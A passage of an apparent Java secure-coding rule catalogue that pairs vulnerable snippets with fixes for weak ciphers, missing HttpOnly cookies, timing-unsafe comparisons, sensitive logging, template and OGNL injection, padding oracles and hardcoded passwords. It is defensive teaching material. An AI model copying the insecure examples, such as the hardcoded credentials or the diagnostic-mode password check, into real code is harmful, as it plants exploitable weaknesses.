<pre>KeyGenerator keyGen = KeyGenerator.getInstance("Blowfish");
keyGen.init(64);</pre>
</p>
<p><b>Solution:</b><br/>
<pre>KeyGenerator keyGen = KeyGenerator.getInstance("Blowfish");
keyGen.init(128);</pre>
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>critical</p>
<h1 id="references">References</h1>
<p><a href="http://en.wikipedia.org/wiki/Blowfish_(cipher)">Blowfish (cipher)</a><br/>
<a href="http://cwe.mitre.org/data/definitions/326.html">CWE-326: Inadequate Encryption Strength</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7490">Cookie without the HttpOnly flag</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Cookie without the HttpOnly flag</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
A new cookie is created without the <code>HttpOnly</code> flag set.
The <code>HttpOnly</code> flag is a directive to the browser to make sure that the cookie can not be read by
malicious script. When a user is the target of a "Cross-Site Scripting", the attacker would benefit greatly from getting
the session id for example.
</p></p>
<p>
<b>Code at risk:</b><br/>
<pre>
Cookie cookie = new Cookie("email",userName);
response.addCookie(cookie);
</pre>
</p>
<p>
<b>Solution (Specific configuration):</b><br/>
<pre>
Cookie cookie = new Cookie("email",userName);
cookie.setSecure(true);
cookie.setHttpOnly(true); //HttpOnly flag
</pre>
</p>
<p>
<b>Solution (Servlet 3.0 configuration):</b><br/>
<pre>
&lt;web-app xmlns="http://java.sun.com/xml/ns/javaee" version="3.0"&gt;
[...]
&lt;session-config&gt;
 &lt;cookie-config&gt;
  &lt;http-only&gt;true&lt;/http-only&gt;
  &lt;secure&gt;true&lt;/secure&gt;
 &lt;/cookie-config&gt;
&lt;/session-config&gt;
&lt;/web-app&gt;
</pre>
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="reference">Reference</h1>
<p><a href="http://blog.codinghorror.com/protecting-your-cookies-httponly/">Coding Horror blog: Protecting Your Cookies: HttpOnly</a><br/>
<a href="https://www.owasp.org/index.php/HttpOnly">OWASP: HttpOnly</a><br/>
<a href="https://www.rapid7.com/db/vulnerabilities/http-cookie-http-only-flag">Rapid7: Missing HttpOnly Flag From Cookie</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7545">Unsafe hash equals</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Unsafe hash equals</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
An attacker might be able to detect the value of the secret hash due to the exposure of comparison timing. When the
functions <code>Arrays.equals()</code> or <code>String.equals()</code> are called, they will exited earlier if less
bytes are matched.
</p>
<p>
<p><b>Vulnerable Code:</b><br/></p>
<pre>
String actualHash = ...

if(userInput.equals(actualHash)) {
    ...
}</pre>
<p></p>
<p><b>Solution:</b><br/></p>
<pre>
String actualHash = ...

if(MessageDigest.isEqual(userInput.getBytes(),actualHash.getBytes())) {
    ...
}</pre>
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="https://cwe.mitre.org/data/definitions/203.html">CWE-203: Information Exposure Through DiscrepancyKey</a><br/>
</p></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/privacy leakage.html">Privacy leakage</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0087">Leaking Sensitive Data</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/privacy-leakage.html">Privacy leakage</a>

                    &#8226; 4 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1">Vulnerable code Example 1</a></li>
<li><a href="#fixed-code-example-1">Fixed Code Example 1</a></li>
<li><a href="#vulnerable-code-example-2">Vulnerable code Example 2</a></li>
<li><a href="#fixed-code-example-2">Fixed code Example 2</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Logging is essential for debugging, incident response, and collecting forensic evidence. Nevertheless, logging sensitive data raises many concerns, including the privacy of the stakeholders, limitations imposed by the law on the collection of personal information, and the potential for data exposure by insiders. Sensitive information includes, but is not limited to, IP addresses, user names and passwords, email addresses, credit card numbers, and any personally identifiable information such as social security numbers. Many countries prohibit or restrict collection of personal data; others permit retention of personal data only when held in an anonymized form. For example, leaking unencrypted credit card numbers into a log file could be a violation of PCI DSS (Payment Card Industry Data Security Standard) regulations [PCI 2010]. Consequently, logs must not contain sensitive data, particularly when prohibited by law.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Unfortunately, violations of this rule are common. For example, prior to version 0.8.1, the LineControl Java client logged sensitive information, including the local user's password, as documented by CVE-2005-2990.</p>
<p>The java.util.logging class provides a basic logging framework for JDK versions 1.4 and higher. Other logging frameworks exist, but the basic principles apply regardless of the particular logging framework chosen.</p>
<p>Programs typically support varying levels of protection. Some information, such as access times, can be safely logged. Some information can be logged, but the log file must be restricted from everyone but particular administrators. Other information, such as credit card numbers, can be included in logs only in encrypted form. Information such as passwords should not be logged at all.</p>
<p>For the following code examples, the log lies outside the trust boundary of the information being recorded. Also, normal log messages should include additional parameters such as date, time, source event, and so forth. This information has been omitted from the following code examples for brevity. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Encrypt the data with a reliable encryption scheme before transmitting.</p>
<p>When using web applications with SSL, use SSL for the entire session from login to logout, not just for the initial login page.</p>
<p>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</p>
<p>Configure servers to use encrypted channels for communication, which may include SSL or other secure protocols. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1">Vulnerable code Example 1</h3>
<p>In this noncompliant code example, a server logs the IP address of the remote client in the event of a security exception. This data can be misused, for example, to build a profile of a user's browsing habits. Such logging may violate legal restrictions in many countries.</p>
<p>When the log cannot contain IP addresses, it should not contain any information about a SecurityException, because it might leak an IP address. When an exception contains sensitive information, the custom MyExceptionReporter class should extract or cleanse it before returning control to the next statement in the catch block (see ERR00-J. Do not suppress or ignore checked exceptions).</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">logRemoteIPAddress</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
  <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">Logger</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="s">"com.organization.Log"</span><span class="o">);</span>
  <span class="n">InetAddress</span> <span class="n">machine</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
  <span class="k">try</span> <span class="o">{</span>
    <span class="n">machine</span> <span class="o">=</span> <span class="n">InetAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">UnknownHostException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Exception</span> <span class="n">e</span> <span class="o">=</span> <span class="n">MyExceptionReporter</span><span class="o">.</span><span class="na">handle</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SecurityException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Exception</span> <span class="n">e</span> <span class="o">=</span> <span class="n">MyExceptionReporter</span><span class="o">.</span><span class="na">handle</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
    <span class="n">logger</span><span class="o">.</span><span class="na">severe</span><span class="o">(</span><span class="n">name</span> <span class="o">+</span> <span class="s">","</span> <span class="o">+</span> <span class="n">machine</span><span class="o">.</span><span class="na">getHostAddress</span><span class="o">()</span> <span class="o">+</span> <span class="s">","</span> <span class="o">+</span>
                  <span class="n">e</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example-1">Fixed Code Example 1</h3>
<p>This compliant solution does not log security exceptions except for the logging implicitly performed by MyExceptionReporter:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// ...</span>
<span class="k">catch</span> <span class="o">(</span><span class="n">SecurityException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
  <span class="n">Exception</span> <span class="n">e</span> <span class="o">=</span> <span class="n">MyExceptionReporter</span><span class="o">.</span><span class="na">handle</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-2">Vulnerable code Example 2</h3>
<p>Log messages with sensitive information should not be printed to the console display for security reasons (a possible example of sensitive information is passenger age). The java.util.logging.Logger class supports different logging levels that can be used for classifying such information: FINEST, FINER, FINE, CONFIG, INFO, WARNING, and SEVERE. By default, the INFO, WARNING, and SEVERE levels print the message to the console, which is accessible by end users and system administrators.
If we assume that the passenger age can appear in log files on the current system but not on the console display, this code example is noncompliant.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">"Age: "</span> <span class="o">+</span> <span class="n">passengerAge</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example-2">Fixed code Example 2</h3>
<p>This compliant solution logs the passenger age at the FINEST level to prevent this information from displaying on the console. As noted previously, we are assuming the age may appear in system log files but not on the console.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Make sure that all handlers only print log messages rated INFO or higher</span>
<span class="n">Handler</span> <span class="n">handlers</span><span class="o">[]</span> <span class="o">=</span> <span class="n">logger</span><span class="o">.</span><span class="na">getHandlers</span><span class="o">();</span>
<span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">handlers</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
  <span class="n">handlers</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">setLevel</span><span class="o">(</span><span class="n">Level</span><span class="o">.</span><span class="na">INFO</span><span class="o">);</span>
<span class="o">}</span>
<span class="c1">// ...</span>
<span class="n">logger</span><span class="o">.</span><span class="na">finest</span><span class="o">(</span><span class="s">"Age: "</span> <span class="o">+</span> <span class="n">passengerAge</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/319.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-CERT">
<p>https://wiki.sei.cmu.edu/confluence/display/java/FIO13-J.+Do+not+log+sensitive+information+outside+a+trust+boundary.html <a class="footnote-backref" href="#fnref-CERT" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">C</a>
                <a href="../../tag/c.html">C++</a>
                <a href="../../tag/java.html">Java</a>
                <a href="../../tag/cwe-319.html">CWE-319</a>
                <a href="../../tag/find-bugs.html">FIND-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7506">Weak SSLContext</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Weak SSLContext</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
<b>Vulnerable Code:</b><br/>
<pre>
    SSLContext.getInstance("SSL");
</pre>
</p>
<p>
<p><b>Solution:</b><br/></p>
<p>Upgrade your implementation to the following, and configure https.protocols JVM option to include TLSv1.2:</p>
<pre>
    SSLContext.getInstance("TLS");
</pre>
<p>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="https://blogs.oracle.com/java-platform-group/entry/diagnosing_tls_ssl_and_https">Diagnosing TLS, SSL, and HTTPS</a>
</p></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7149">Public static method may expose internal representation by returning array</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Public static method may expose internal representation by returning array</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p> A public static method returns a reference to
   an array that is part of the static state of the class.
   Any code that calls this method can freely modify
   the underlying array.
   One fix is to return a copy of the array.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-bugs.html">FIND-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7589">Potential template injection with Velocity</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Potential template injection with Velocity</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
Velocity template engine is powerful. It is possible to add logic including condition statements, loops and external calls.
It is not design to be sandbox to templating operations. A malicious user in control of a template can run malicious code
on the server-side. Velocity templates should be seen as scripts.
</p>
<p>
<b>Vulnerable Code:</b>
<pre>[...]</pre></p>
<p>Velocity.evaluate(context, swOut, "test", userInput);</p></p>

<p>
<b>Solution:</b>
<br/>
Avoid letting end users manipulate templates with Velocity. If you need to expose template editing to your users,
prefer logic-less template engines such as Handlebars or Moustache (See references).
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
<h1 id="references">References</h1>
<p><a href="http://blog.portswigger.net/2015/08/server-side-template-injection.html">PortSwigger: Server-Side Template Injection </a><br/>
<a href="https://jknack.github.io/handlebars.java/">Handlebars.java</a><br/>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1087">OGNL Expression Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Forced double OGNL(Object-Graph Navigation Language) evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>The Apache Struts frameworks when forced, performs double evaluation of attributes' values assigned to certain tags so it is possible to pass in a value that will be evaluated again when a tag's attributes will be rendered.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Always validate incoming parameters' values when re-assigning them to certain Struts' tags attributes.</p>
</li>
<li>
<p>Don't use %{...} syntax in tag attributes other than value unless you have a valid use-case.</p>
</li>
<li>
<p>Alternatively upgrade to Struts 2.3.20.3, Struts 2.3.24.3 or Struts 2.3.28</p>
</li>
</ul>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-apache">
<p>https://cwiki.apache.org/confluence/display/WW/S2-036 <a class="footnote-backref" href="#fnref-apache" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7564">Cipher is susceptible to Padding Oracle</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Cipher is susceptible to Padding Oracle</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    This specific mode of CBC with PKCS5Padding is susceptible to padding oracle attacks. An adversary could potentially decrypt the
    message if the system exposed the difference between plaintext with invalid padding or valid padding. The distinction between
    valid and invalid padding is usually revealed through distinct error messages being returned for each condition.
</p>
<p>
<b>Code at risk:</b>
<pre>Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);</pre>
</p>
<p>
<b>Solution:</b>
<pre>Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://www.infobytesec.com/down/paddingoracle_openjam.pdf">Padding Oracles for the masses (by Matias Soler)</a><br/>
<a href="http://en.wikipedia.org/wiki/Authenticated_encryption">Wikipedia: Authenticated encryption</a><br/>
<a href="http://csrc.nist.gov/groups/ST/toolkit/BCM/modes_development.html#01">NIST: Authenticated Encryption Modes</a><br/>
<a href="http://capec.mitre.org/data/definitions/463.html">CAPEC: Padding Oracle Crypto Attack</a><br/>
<a href="http://cwe.mitre.org/data/definitions/696.html">CWE-696: Incorrect Behavior Order</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/privacy leakage.html">Privacy leakage</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1112">Hardcoded Password</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/privacy-leakage.html">Privacy leakage</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#vulnerable-code-example-2">Vulnerable Code Example 2</a></li>
<li><a href="#vulnerable-code-example-3">Vulnerable Code Example 3</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software contains a hard-coded password, which it uses for its own inbound authentication or for outbound communication to external components.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>A hard-coded password typically leads to a significant authentication failure that can be difficult for the system administrator to detect. Once detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:</p>
<ul>
<li>Inbound: the software contains an authentication mechanism that checks for a hard-coded password.</li>
<li>Outbound: the software connects to another system or component, and it contains hard-coded password for connecting to that component.</li>
</ul>
<p>In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the software. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the software will have the same password, even across different organizations, this enables massive attacks such as worms to take place.</p>
<p>The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>For outbound authentication: store passwords outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system.</li>
<li>For inbound authentication: Rather than hard-code a default username and password for first time logins, utilize a "first login" mode that requires the user to enter a unique strong password.</li>
<li>For inbound authentication: apply strong one-way hashes to your passwords and store those hashes in a configuration file or database with appropriate access control.</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The following code uses a hard-coded password to connect to a database:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">...</span>
<span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="s">"scott"</span><span class="o">,</span> <span class="s">"tiger"</span><span class="o">);</span>
<span class="o">...</span>
</pre></div>
</td></tr></table>
<p>This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">javap</span> <span class="nt">-c</span> <span class="nt">ConnMngr</span><span class="p">.</span><span class="nc">class</span>
<span class="nt">22</span><span class="o">:</span> <span class="nt">ldc</span> <span class="p">#</span><span class="nn">36</span><span class="o">;</span> <span class="o">//</span><span class="nt">String</span> <span class="nt">jdbc</span><span class="p">:</span><span class="nd">mysql</span><span class="o">://</span><span class="nt">ixne</span><span class="p">.</span><span class="nc">com</span><span class="o">/</span><span class="nt">rxsql</span>
<span class="nt">24</span><span class="o">:</span> <span class="nt">ldc</span> <span class="p">#</span><span class="nn">38</span><span class="o">;</span> <span class="o">//</span><span class="nt">String</span> <span class="nt">scott</span>
<span class="nt">26</span><span class="o">:</span> <span class="nt">ldc</span> <span class="p">#</span><span class="nn">17</span><span class="o">;</span> <span class="o">//</span><span class="nt">String</span> <span class="nt">tiger</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-2">Vulnerable Code Example 2</h3>
<p>The following code is an example of an internal hard-coded password in the back-end:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">VerifyAdmin</span><span class="o">(</span><span class="n">String</span> <span class="n">password</span><span class="o">)</span> <span class="o">{</span>
<span class="k">if</span> <span class="o">(!</span><span class="n">password</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"Mew!"</span><span class="o">))</span> <span class="o">{</span>
<span class="k">return</span><span class="o">(</span><span class="mi">0</span><span class="o">)</span>
<span class="o">}</span>
<span class="c1">//Diagnostic Mode</span>
<span class="k">return</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this "functionality."</p>
<h3 id="vulnerable-code-example-3">Vulnerable Code Example 3</h3>
<p>This Java example shows a properties file with a plaintext username / password pair.</p>
